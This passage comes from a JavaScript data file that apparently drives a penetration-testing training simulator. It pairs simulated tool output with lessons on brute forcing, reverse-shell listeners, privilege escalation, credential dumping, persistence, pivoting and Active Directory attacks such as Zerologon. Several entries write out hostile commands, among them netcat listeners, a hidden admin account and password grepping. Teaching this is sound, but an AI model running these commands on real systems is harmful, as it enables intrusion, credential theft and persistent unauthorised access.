      teach: 'Against a confirmed FTP service with a known user, a measured hydra run finds weak passwords — and always test `anonymous` first, it is free. Keep the wordlist focused; lab and real accounts both lock out under a flood.',
    },
    'online-brute-rdp': {
      output: [
        '[DATA] attacking rdp://10.10.10.10:3389/',
        '[3389][rdp] host: 10.10.10.10   login: admin   password: Password1',
      ].join('\n'),
      signal: '[3389][rdp] host: 10.10.10.10   login: admin   password: Password1',
      teach: 'A weak RDP password is an interactive desktop. Brute it only when you have a real username and a short list — RDP lockout policies are unforgiving. A hit here is a full GUI session as that user.',
    },

    // ==================== DATABASES (depth) ====================
    'mssql-login': {
      output: [
        'SQL> SELECT @@version;',
        'Microsoft SQL Server 2019 (RTM) ...',
        'SQL> SELECT IS_SRVROLEMEMBER(\'sysadmin\') AS is_sysadmin;',
        'is_sysadmin : 1',
      ].join('\n'),
      signal: 'is_sysadmin : 1',
      teach: 'The first thing to check on an MSSQL login is `IS_SRVROLEMEMBER(\'sysadmin\')`. A `1` means you can re-enable xp_cmdshell and run OS commands, or impersonate other logins. Sysadmin on MSSQL is effectively a shell on the host.',
    },
    'mongo-enum': {
      output: [
        'PORT      STATE SERVICE',
        '27017/tcp open  mongodb',
        '| mongodb-databases:',
        '|   admin   users   app_secrets',
        '|_  (no authentication required)',
      ].join('\n'),
      signal: '|_  (no authentication required)',
      teach: 'MongoDB historically shipped with no authentication. If you can list databases without credentials, you can read them — `app_secrets` and `users` collections often hold password hashes or API keys outright.',
    },

    // ==================== SHELLS & TRANSFER (depth) ====================
    'ssh-key-login': {
      output: [
        '$ chmod 600 id_rsa',
        '$ ssh -i id_rsa bob@10.10.10.10',
        'Last login: Mon Jan  1 10:00:00 2024',
        'bob@target:~$ id',
        'uid=1000(bob) gid=1000(bob)',
      ].join('\n'),
      signal: 'bob@target:~$ id',
      teach: 'A private key you looted is a password-free login — but SSH refuses a key that others can read, hence `chmod 600`. A stable SSH session beats any reverse shell: it has a real TTY and survives. Always try looted keys against every user and host.',
    },
    'shell-listener': {
      output: [
        '$ rlwrap nc -lvnp 4444',
        'listening on [any] 4444 ...',
      ].join('\n'),
      signal: 'listening on [any] 4444 ...',
      teach: 'Before you fire a reverse shell, start the catcher. `nc -lvnp 4444` listens; wrapping it in `rlwrap` gives you command history and arrow keys once the shell lands. Set the listener first — a callback with nothing listening is lost.',
    },
    'shell-revshell-windows': {
      output: [
        'listening on [any] 4444 ...',
        'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 50122',
        'PS C:\\> whoami',
        'corp\\svc_web',
      ].join('\n'),
      signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 50122',
      teach: 'A PowerShell reverse shell calls back to your listener the same way a Linux one does — the "connect to … from" line is the target reaching you. You land as the service account the web app runs under; the next step is Windows enumeration.',
    },

    // ==================== LINUX PRIVESC (depth) ====================
    'nfs-squash': {
      output: [
        '$ showmount -e 10.10.10.10',
        '/srv/share  10.10.10.0/24   (no_root_squash)',
        '$ # mount it, drop a root-owned SUID binary from your box',
        '# mounted; owner uid 0 preserved',
      ].join('\n'),
      signal: '/srv/share  10.10.10.0/24   (no_root_squash)',
      teach: '`no_root_squash` on an NFS export means files you create as root on your own machine stay root-owned on the target. Drop a root-owned SUID shell into the share and run it on the box — a classic NFS privesc. Check the export options first.',
    },
    'lxc-lxd-escape': {
      output: [
        '$ id',
        'uid=1000(user) gid=1000(user) groups=1000(user),110(lxd)',
        '$ # import a tiny image, launch it privileged, mount host /',
        'root@container:/mnt/root# cat /mnt/root/root/root.txt',
      ].join('\n'),
      signal: 'uid=1000(user) gid=1000(user) groups=1000(user),110(lxd)',
      teach: 'Membership in the `lxd` group is root-equivalent: you launch a privileged container that mounts the host\'s filesystem at /mnt/root and read or write anything as root. Like the docker group, lxd is a privilege nobody thinks of as one.',
    },
    'linux-loot-hunt': {
      output: [
        '$ cat ~/.bash_history',
        'mysql -u root -pSuperSecret123',
        '$ grep -rils "password" /var/www 2>/dev/null',
        '/var/www/html/config.php: $db_pass = "w3b4ppp4ss";',
      ].join('\n'),
      signal: '/var/www/html/config.php: $db_pass = "w3b4ppp4ss";',
      teach: 'Once you have a shell, loot before you escalate. Shell history, config files, and web roots leak passwords constantly — and people reuse them, so a web app\'s DB password is often root\'s too. Grep widely for "password", "secret", and "key".',
    },
    'linux-persistence': {
      output: [
        '$ mkdir -p ~/.ssh && echo "ssh-ed25519 AAAA...you" >> ~/.ssh/authorized_keys',
        '$ ssh -i you user@10.10.10.10',
        'user@target:~$  # back in, no password',
      ].join('\n'),
      signal: 'user@target:~$  # back in, no password',
      teach: 'Labs revert and shells die. Adding your public key to `authorized_keys` gives you a stable, password-free way back in — far better than re-exploiting each time. On a real engagement, persistence is scoped and documented; on the exam it just saves you grief.',
    },

    // ==================== WINDOWS PRIVESC (depth) ====================
    'dpapi-secrets': {
      output: [
        '$ # Credentials + masterkey blobs found under %APPDATA%',
        '[*] Decrypting with user masterkey',
        '[CREDENTIAL] Target: LegacyGeneric:target=git  User: svc_build  Pass: Bu1ld!2023',
      ].join('\n'),
      signal: '[CREDENTIAL] Target: LegacyGeneric:target=git  User: svc_build  Pass: Bu1ld!2023',
      teach: 'Windows DPAPI encrypts saved browser and app passwords with a key derived from the user\'s login. With that user\'s context (or their masterkey) you decrypt the blobs and recover cleartext credentials — often for other systems the user accessed.',
    },
    'windows-old-hives': {
      output: [
        '$ dir C:\\Windows.old\\Windows\\System32\\config',
        'SAM   SYSTEM   SECURITY',
        '$ # pull them, then dump offline',
        'Administrator:500:aad3b...:2b576acbe6b...:::',
      ].join('\n'),
      signal: 'Administrator:500:aad3b...:2b576acbe6b...:::',
      teach: 'A `Windows.old` folder from an in-place upgrade keeps old registry hives — SAM and SYSTEM — that a low-priv user can often read. Dump them offline for the local Administrator hash, then pass it. Leftover backups are a quiet privesc.',
    },
    'lsass-dump-onbox': {
      output: [
        '$ # with local admin, LSASS memory holds live secrets',
        '[*] Parsing credentials from the dump',
        'Username: administrator   NTLM: 2b576acbe6b...',
      ].join('\n'),
      signal: 'Username: administrator   NTLM: 2b576acbe6b...',
      teach: 'LSASS holds the credentials of everyone logged in. With local admin you can read its memory and recover NTLM hashes (and sometimes cleartext) for those sessions — including, on a shared box, domain admins. Those hashes feed pass-the-hash and lateral movement.',
    },
    'windows-persistence': {
      output: [
        'C:\\> net user obol_svc Str0ng!Pass /add',
        'The command completed successfully.',
        'C:\\> net localgroup Administrators obol_svc /add',
        'The command completed successfully.',
      ].join('\n'),
      signal: 'C:\\> net localgroup Administrators obol_svc /add',
      teach: 'A local admin account you add is a durable way back onto a Windows box after a revert or reboot. On a real engagement this is scoped, logged, and cleaned up afterward; on the exam it saves you re-escalating. Note what you create so you can remove it.',
    },
    'defense-enum': {
      output: [
        'PS> $ExecutionContext.SessionState.LanguageMode',
        'ConstrainedLanguage',
        'PS> Get-AppLockerPolicy -Effective -Xml  # rules present',
        'PS> Get-MpComputerStatus | select RealTimeProtectionEnabled',
        'True',
      ].join('\n'),
      signal: 'ConstrainedLanguage',
      teach: 'Before you throw tooling at a Windows box, learn what is watching: Constrained Language Mode, AppLocker, and real-time protection all change what will run. Knowing the constraints up front saves you from burning a shell on something that was never going to execute.',
    },

    // ==================== PIVOTING & TUNNELING (depth) ====================
    'local-linux-routes': {
      output: [
        '$ ip route',
        'default via 10.10.10.1 dev eth0',
        '172.16.5.0/24 dev eth1  proto kernel  scope link',
      ].join('\n'),
      signal: '172.16.5.0/24 dev eth1  proto kernel  scope link',
      teach: 'The routing table on a compromised host shows which networks it can reach directly. A route to 172.16.5.0/24 that you cannot touch from your box is exactly what you pivot through this host to reach.',
    },
    'local-linux-neighbors': {
      output: [
        '$ ip neigh',
        '172.16.5.20 dev eth1 lladdr 00:0c:29:aa:bb:cc REACHABLE',
        '172.16.5.25 dev eth1 lladdr 00:0c:29:dd:ee:ff STALE',
      ].join('\n'),
      signal: '172.16.5.20 dev eth1 lladdr 00:0c:29:aa:bb:cc REACHABLE',
      teach: 'The ARP/neighbour cache lists hosts this box has actually talked to on the internal segment — live, confirmed targets you could not see from outside. It is a free, no-scan map of what is alive next door.',
    },
    'local-linux-dns': {
      output: [
        '$ cat /etc/resolv.conf',
        'search corp.local',
        'nameserver 172.16.5.10',
      ].join('\n'),
      signal: 'nameserver 172.16.5.10',
      teach: 'The internal DNS server and search domain tell you this host lives in `corp.local` and resolves names via 172.16.5.10 — likely a domain controller. Internal DNS is both a high-value target and a way to enumerate the internal network by name.',
    },
    'local-windows-interfaces': {
      output: [
        'C:\\> ipconfig',
        'Ethernet adapter Ethernet0:',
        '   IPv4 Address. . . : 10.10.10.20',
        'Ethernet adapter Ethernet1:',
        '   IPv4 Address. . . : 172.16.5.20',
      ].join('\n'),
      signal: '   IPv4 Address. . . : 172.16.5.20',
      teach: 'A dual-homed Windows host bridges two networks. The second address (172.16.5.20) is on a segment you reach only through this box — the reason to pivot. Map the interfaces first; they define what is now in range.',
    },
    'local-windows-routes': {
      output: [
        'C:\\> route print',
        'Network Destination  Netmask        Gateway    Interface',
        '172.16.5.0           255.255.255.0  On-link    172.16.5.20',
      ].join('\n'),
      signal: '172.16.5.0           255.255.255.0  On-link    172.16.5.20',
      teach: 'Windows `route print` shows the networks this host routes to directly. An "On-link" entry for 172.16.5.0/24 is a subnet reachable from here but not from your box — your pivot target.',
    },
    'local-windows-neighbors': {
      output: [
        'C:\\> arp -a',
        'Interface: 172.16.5.20',
        '  172.16.5.10     00-0c-29-11-22-33   dynamic',
        '  172.16.5.30     00-0c-29-44-55-66   dynamic',
      ].join('\n'),
      signal: '  172.16.5.10     00-0c-29-11-22-33   dynamic',
      teach: 'The Windows ARP cache lists internal hosts this box has communicated with — confirmed-alive targets on the far side, discovered without sending a single scan packet. Start your internal enumeration from these.',
    },
    'local-windows-listeners': {
      output: [
        'C:\\> netstat -ano | findstr LISTENING',
        '  TCP    0.0.0.0:445      LISTENING   4',
        '  TCP    127.0.0.1:1433   LISTENING   3120',
      ].join('\n'),
      signal: '  TCP    127.0.0.1:1433   LISTENING   3120',
      teach: 'A service bound to 127.0.0.1 is reachable only from the box itself — like MSSQL on 1433 here. You cannot hit it from the network, but once you tunnel in, that loopback-only service becomes a target. Local listeners reveal what a pivot unlocks.',
    },
    'pivot-ssh-dynamic': {
      output: [
        '$ ssh -D 1080 -N bob@10.10.10.10',
        '$ tail /etc/proxychains4.conf',
        'socks5 127.0.0.1 1080',
        '$ proxychains -q nmap -sT -Pn 172.16.5.20',
      ].join('\n'),
      signal: 'socks5 127.0.0.1 1080',
      teach: 'An SSH dynamic port-forward (`-D`) turns an SSH session into a SOCKS proxy — the simplest pivot when you have SSH creds, no extra tools needed. Point proxychains at 127.0.0.1:1080 and your tools reach the internal network through the box.',
    },
    'pivot-sshuttle': {
      output: [
        '$ sshuttle -r bob@10.10.10.10 172.16.5.0/24',
        'c : Connected to server.',
        '$ nmap -sT -Pn 172.16.5.20   # no proxychains needed',
      ].join('\n'),
      signal: 'c : Connected to server.',
      teach: 'sshuttle builds a transparent VPN-like route over SSH: once "Connected", traffic to 172.16.5.0/24 just works, with no proxychains wrapper. It is the most convenient pivot when you have SSH access and want your tools to behave normally.',
    },
    'pivot-ligolo': {
      output: [
        'ligolo-proxy » session',
        '[Agent] joined from 10.10.10.20',
        'ligolo-proxy » # add route to 172.16.5.0/24 via the tun iface',
        '[+] Route added, internal subnet reachable',
      ].join('\n'),
      signal: '[+] Route added, internal subnet reachable',
      teach: 'Ligolo-ng gives you a real network interface to the internal subnet — fast, and no proxychains. Run the agent on the compromised host, add a route to 172.16.5.0/24, and your box reaches it natively. The modern choice for a clean pivot.',
    },
    'pivot-scan-through': {
      output: [
        '$ proxychains -q nmap -sT -Pn -n 172.16.5.20',
        '172.16.5.20   PORT   STATE SERVICE',
        '172.16.5.20   445/tcp open  microsoft-ds',
      ].join('\n'),
      signal: '172.16.5.20   445/tcp open  microsoft-ds',
      teach: 'Through a SOCKS proxy you must use TCP connect scans (`-sT`) and skip host discovery (`-Pn`) — SYN scans and ping do not survive a proxy. Scanning the internal host over your pivot is how enumeration starts all over again, one network deeper.',
    },

    // ==================== RECON (remaining services) ====================
    'nmap-vuln-scripts': {
      output: [
        'PORT   STATE SERVICE',
        '80/tcp open  http',
        '| http-vuln-cve2017-5638:',
        '|   VULNERABLE: Apache Struts2 RCE (S2-045)',
        '|_    References: https://nvd.nist.gov/vuln/detail/CVE-2017-5638',
      ].join('\n'),
      signal: '|   VULNERABLE: Apache Struts2 RCE (S2-045)',
      teach: 'Nmap\'s `--script vuln` runs safe-ish checks that flag known CVEs on the open ports. Treat a VULNERABLE line as a strong lead to verify, not a guaranteed win — scripts can false-positive, so confirm before you commit.',
    },
    'recon-ike-vpn': {
      output: [
        '$ sudo ike-scan -M 10.10.10.10',
        '10.10.10.10  Main Mode Handshake returned',
        '  Encryption: 3DES  Hash: SHA1  Auth: PSK  Group: 2',
        '  Aggressive Mode supported — PSK hash obtainable',
      ].join('\n'),
      signal: '  Aggressive Mode supported — PSK hash obtainable',
      teach: 'An IKE/IPsec VPN on UDP 500 that allows Aggressive Mode will hand back a pre-shared-key hash you can crack offline. A dated 3DES/SHA1/PSK config is both a finding and a potential route into the VPN.',
    },
    'recon-finger': {
      output: [
        '$ finger @10.10.10.10',
        'Login     Name       TTY   Idle   When',
        'root      root       *     1d     Mon 09:14',
        'bmurphy   Bob Murphy pts/0  2:00   Mon 11:02',
      ].join('\n'),
      signal: 'bmurphy   Bob Murphy pts/0  2:00   Mon 11:02',
      teach: 'The finger service (port 79) is ancient but still appears on old Unix boxes. It leaks real usernames and who is logged in — `bmurphy` is a confirmed account to spray or brute. Enumerate it whenever 79 is open.',
    },
    'recon-vnc': {
      output: [
        'PORT     STATE SERVICE',
        '5900/tcp open  vnc',
        '| vnc-info:',
        '|   Security types: VNC Authentication (2)',
        '|_  None (1)  — no password required',
      ].join('\n'),
      signal: '|_  None (1)  — no password required',
      teach: 'A VNC server that offers "None" security is an unauthenticated remote desktop — connect and you are on the box\'s screen. Even when it wants a password, VNC passwords are short and crackable. Always check what auth a VNC port requires.',
    },
    'recon-mail': {
      output: [
        'PORT    STATE SERVICE',
        '110/tcp open  pop3',
        '143/tcp open  imap',
        '| pop3-capabilities: USER TOP UIDL',
        '|_pop3-ntlm-info: Domain: CORP',
      ].join('\n'),
      signal: '|_pop3-ntlm-info: Domain: CORP',
      teach: 'Mail services leak more than you expect: POP3/IMAP capabilities, and via NTLM auth the internal domain name (CORP). With a valid mailbox credential you can read mail for secrets, password-reset links, and internal contacts.',
    },

    // ==================== ACTIVE DIRECTORY (named CVEs — confirm the lab first) ====================
    'zerologon-check': {
      output: [
        '$ zerologon-scan DC01 10.10.10.10',
        'Performing authentication attempts...',
        'Success! DC01 is vulnerable to Zerologon (CVE-2020-1472).',
      ].join('\n'),
      signal: 'Success! DC01 is vulnerable to Zerologon (CVE-2020-1472).',
      teach: 'Zerologon checks whether a DC accepts an all-zero challenge to reset its own machine password. The check is safe; the exploit is NOT — it breaks the DC\'s secure channel and must be restored afterward. Confirm it is a lab you own before going further.',
    },
    'zerologon-exploit': {
      output: [
        '[*] Resetting DC01$ machine account password to empty',
        '[+] Success — authenticating with empty hash',
        '[*] Dumping domain hashes (DCSync)',
        'Administrator:500:aad3b...:31d6cfe0...:::',
      ].join('\n'),
      signal: '[*] Dumping domain hashes (DCSync)',
      teach: 'Zerologon zeroes the DC\'s machine password, letting you DCSync the whole domain — total compromise. It also breaks the DC until you restore the original password from the local SAM, so the restore step is mandatory. Lab-only, high-risk.',
    },
    'nopac': {
      output: [
        '[*] Exploiting CVE-2021-42278 + CVE-2021-42287 (sAMAccountName spoofing)',
        '[+] Got TGT impersonating domain administrator',
        '[*] Dumping NTDS via DCSync',
        'krbtgt:502:aad3b...:...:::',
      ].join('\n'),
      signal: '[+] Got TGT impersonating domain administrator',
      teach: 'noPac abuses a sAMAccountName confusion to get a ticket as a DC/administrator from an ordinary user — a near-instant domain takeover on unpatched DCs. It is beyond core OSCP scope but common in labs; verify the DC is unpatched first.',
    },
    'printnightmare': {
      output: [
        '[*] Triggering the print spooler to load a remote driver',
        '[+] Driver loaded — code executed as SYSTEM',
        'C:\\> whoami',
        'nt authority\\system',
      ].join('\n'),
      signal: 'nt authority\\system',
      teach: 'PrintNightmare (CVE-2021-34527) abuses the Print Spooler to run a driver as SYSTEM — local privesc, or remote with creds. Check whether the Spooler service is even running first; if it is disabled, this path is closed.',
    },
    'ms14-068': {
      output: [
        '$ impacket-goldenPac corp.local/jdoe@dc01',
        '[*] Requesting TGT with forged PAC (admin SID)',
        '[+] Authenticated as Domain Admin — opening shell',
        'C:\\Windows\\system32>',
      ].join('\n'),
      signal: '[+] Authenticated as Domain Admin — opening shell',
      teach: 'MS14-068 forges the PAC inside a Kerberos ticket so an ordinary user claims Domain Admin group membership. It only works on DCs missing the 2014 patch — rare today, but a clean, memorable example of how PAC validation can fail.',
    },
    'diamond-ticket': {
      output: [
        '[*] Requesting a legitimate TGT for jdoe',
        '[*] Decrypting with krbtgt key, patching PAC → administrator',
        '[+] Saving diamond ticket to administrator.ccache',
      ].join('\n'),
      signal: '[+] Saving diamond ticket to administrator.ccache',
      teach: 'A diamond ticket modifies a real TGT instead of forging one from scratch (like a golden ticket), so its details match a genuine request and look less anomalous. Both need the krbtgt key — this is a stealth refinement of the same post-DA persistence.',
    },
    'gpo-abuse': {
      output: [
        '[*] jdoe has edit rights on GPO {31B2F340-...}',
        '[*] Adding an immediate scheduled task to the GPO',
        '[+] Task will run on next gpupdate as SYSTEM on linked hosts',
      ].join('\n'),
      signal: '[+] Task will run on next gpupdate as SYSTEM on linked hosts',
      teach: 'Write access to a Group Policy Object lets you push a scheduled task or script to every computer the GPO is linked to — code execution as SYSTEM across an OU. A single misassigned GPO permission can escalate to a whole fleet of machines.',
    },
    'dnsadmins-abuse': {
      output: [
        '[*] Member of DnsAdmins — setting ServerLevelPluginDll',
        '[*] Restarting DNS service to load the DLL',
        '[+] DLL executed as SYSTEM on the DC',
      ].join('\n'),
      signal: '[+] DLL executed as SYSTEM on the DC',
      teach: 'The DnsAdmins group can tell the DNS service (often running on a DC) to load an arbitrary DLL, which then runs as SYSTEM. It needs a service restart, so it is noisy — but membership in DnsAdmins is a direct line to owning the DC.',
    },
    'sid-history-abuse': {
      output: [
        '[*] Forging a ticket with SID History = Enterprise Admins',
        '[+] Saving ticket; principal now carries the EA SID',
        '[*] Cross-domain access granted via SID History',
      ].join('\n'),
      signal: '[*] Cross-domain access granted via SID History',
      teach: 'SID History lets a principal carry privileged SIDs from another domain — legitimately used in migrations, abused to smuggle Enterprise Admin rights across a trust. It is how a single-domain compromise becomes forest-wide.',
    },
    'wsus-abuse': {
      output: [
        'C:\\> SharpWSUS.exe locate',
        '[+] WSUS server: http://wsus.corp.local:8530 (HTTP, not HTTPS)',
        '[*] A malicious "update" could be approved to run as SYSTEM',
      ].join('\n'),
      signal: '[+] WSUS server: http://wsus.corp.local:8530 (HTTP, not HTTPS)',
      teach: 'WSUS served over plain HTTP lets an attacker who can approve updates push a signed Microsoft binary with attacker-chosen arguments to clients — running as SYSTEM. An internal patch server is a high-value, often-overlooked target.',
    },
    'sccm-enum': {
      output: [
        '$ sccmhunter find -u jdoe -p ... -d corp.local',
        '[+] Management Point: MP01.corp.local',
        '[+] Network Access Account credentials retrievable',
        'CORP\\svc_naa : NAA-P@ssw0rd',
      ].join('\n'),
      signal: 'CORP\\svc_naa : NAA-P@ssw0rd',
      teach: 'SCCM/MECM deployments store Network Access Account credentials that clients can retrieve — frequently over-privileged and reusable across the domain. Enumerating the management point often hands you a working service credential outright.',
    },

    // ==================== FLAGS & PROOF ====================
    'flag-hunt-linux': {
      output: [
        '$ find / -name "*.txt" 2>/dev/null | grep -iE "user|root|proof|flag"',
        '/home/bob/user.txt',
        '/root/root.txt',
        '$ cat /root/root.txt',
        'd41d8cd98f00b204e9800998ecf8427e',
      ].join('\n'),
      signal: 'd41d8cd98f00b204e9800998ecf8427e',
      teach: 'The flags are the point: `user.txt` in a home directory, `root.txt` under /root. Capture both — and on a real exam, also screenshot the hostname, your id/whoami, and the IP in the same frame so the proof is undeniable.',
    },
    'flag-hunt-windows': {
      output: [
        'C:\\> type C:\\Users\\bob\\Desktop\\user.txt',
        '7f6b2c...e1a9',
        'C:\\> type C:\\Users\\Administrator\\Desktop\\proof.txt',
        'a0c3f1...9d2b',
      ].join('\n'),
      signal: 'a0c3f1...9d2b',
      teach: 'On Windows the flags sit on the Desktops — `user.txt` for the low-priv user, `proof.txt` (or root.txt) for Administrator. Grab both, and capture `whoami`, `hostname`, and `ipconfig` alongside the flag so your screenshot proves the compromise.',
    },

  };
})(typeof globalThis !== 'undefined' ? globalThis : this);
